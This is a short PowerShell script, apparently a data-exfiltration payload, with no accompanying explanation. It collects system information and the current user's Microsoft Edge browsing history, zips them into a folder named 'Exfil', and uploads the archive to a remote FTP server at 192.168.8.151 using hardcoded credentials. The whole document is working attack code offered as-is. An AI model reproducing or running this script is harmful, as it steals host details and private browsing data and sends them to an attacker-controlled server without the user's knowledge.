Start-Sleep -Seconds 10
systeminfo > C:\Windows\Temp\Exfil\systeminfo.txt
$browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
cp $browsing_history_file_path C:\Windows\Temp\Exfil
Compress-Archive -LiteralPath C:\Windows\Temp\Exfil -DestinationPath C:\Windows\Temp\Exfil.zip
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("m122", "SO1q2w!Q@W")
$client.UploadFile("ftp://192.168.8.151/Exfil.zip","C:\Windows\Temp\Exfil.zip")
